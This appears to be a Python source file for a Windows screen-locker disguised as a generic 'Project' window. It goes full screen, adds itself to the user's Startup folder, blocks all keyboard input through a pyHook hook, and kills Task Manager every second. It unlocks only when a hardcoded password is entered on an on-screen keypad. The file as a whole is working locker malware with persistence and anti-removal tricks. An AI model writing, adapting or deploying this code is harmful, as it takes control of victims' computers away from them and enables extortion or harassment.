from tkinter import *
import getpass
import os
from threading import Thread
import pythoncom, pyHook 
import subprocess
from time import sleep

'''
Put your own password to the password variable
'''
password = "1234567890"

si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW

def kill_tskmgr(event=None): 
## just as the task manager starts it will get killed by the function
    while True:
        subprocess.call("taskkill /F /IM Taskmgr.exe", startupinfo=si)
        sleep(1)

USER_NAME = getpass.getuser()
def add_to_startup(file_path=""):
## adding the file to startup  
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "project.bat", "w+") as bat_file:
        bat_file.write(r'%s\project.exe' % file_path)

def copy(event=None):
    text = my_string.get()
    my_string.set("")
    top.clipboard_append(text)
    top.update()
def check(event=None):
    text = my_string.get()
    my_string.set("")
    if text == password:
        exit(0)

def qkey(event=None):
    text = my_string.get()+'1'
    my_string.set(text)
def wkey(event=None):
    text = my_string.get()+'2'
    my_string.set(text)
def ekey(event=None):
    text = my_string.get()+'3'
    my_string.set(text)
def rkey(event=None):
    text = my_string.get()+'4'
    my_string.set(text)
def tkey(event=None):
    text = my_string.get()+'5'
    my_string.set(text)
def ykey(event=None):
    text = my_string.get()+'6'
    my_string.set(text)
def ukey(event=None):
    text = my_string.get()+'7'
    my_string.set(text)
def ikey(event=None):
    text = my_string.get()+'8'
    my_string.set(text)
def okey(event=None):
    text = my_string.get()+'9'
    my_string.set(text)
def pkey(event=None):
    text = my_string.get()+'0'
    my_string.set(text)
add_to_startup()

def uMad(event=None):
    return False

def block_key(event=None):
    hm = pyHook.HookManager()
    hm.KeyAll = uMad
    hm.HookKeyboard()
    pythoncom.PumpMessages()

if __name__ == '__main__':
    while(True):
        top = Tk()
        top.attributes("-fullscreen", True)
        top.title("Project")
        fm = Frame(top, borderwidth=10)
        but = Frame(top, borderwidth=10)
        var = Label(top, text="This is the Project", anchor=N)
        var.pack()

        send_button = Button(but, text="Copy to Clipboard", command=copy)
        send_button.pack(side=TOP, expand=YES)
        my_string = StringVar()  # For the string to be copied.
        my_string.set("Type your Text here.")  # To navigate through past clipboard.
        # Following will contain the text.

        entry_field = Entry(fm, textvariable=my_string)
        entry_field.bind("<Return>", check)
        entry_field.pack(side=LEFT)
        enter_button = Button(fm, text="Enter to Exit", command=check)
        enter_button.pack(side=BOTTOM, expand=YES)
        
        but.pack(side=BOTTOM)
        fm.pack(side=BOTTOM)
        keybrd = Frame(top)
        keyboard1 = Frame(keybrd)
        keyboard2 = Frame(keybrd)
        keyboard3 = Frame(keybrd)
        keyboard4 = Frame(keybrd)
        q = Button(keyboard1, text="1", command=qkey)
        q.pack(side=LEFT,expand=True)
        w = Button(keyboard1, text="2", command=wkey)
        w.pack(expand=True)
        e = Button(keyboard1, text="3", command=ekey)
        e.pack(side=RIGHT,expand=True)
        r = Button(keyboard2, text="4", command=rkey)
        r.pack(side=LEFT,expand=True)
        t = Button(keyboard2, text="5", command=tkey)
        t.pack(expand=True)
        y = Button(keyboard2, text="6", command=ykey)
        y.pack(side=RIGHT,expand=True)
        u = Button(keyboard3, text="7", command=ukey)
        u.pack(side=LEFT,expand=True)
        i = Button(keyboard3, text="8", command=ikey)
        i.pack(expand=True)
        o = Button(keyboard3, text="9", command=okey)
        o.pack(side=RIGHT,expand=True)
        p = Button(keyboard4, text="0", command=pkey)
        p.pack( expand=True)
        keyboard4.pack(side=BOTTOM)
        keyboard3.pack(side=BOTTOM)
        keyboard2.pack(side=BOTTOM)
        keyboard1.pack(side=BOTTOM)
        keybrd.pack()
        keyboard_thread = Thread(target=block_key)
        keyboard_thread.start()
        taskmanager_thread = Thread(target=kill_tskmgr)
        taskmanager_thread.start()
        mainloop() # Starts GUI execution.
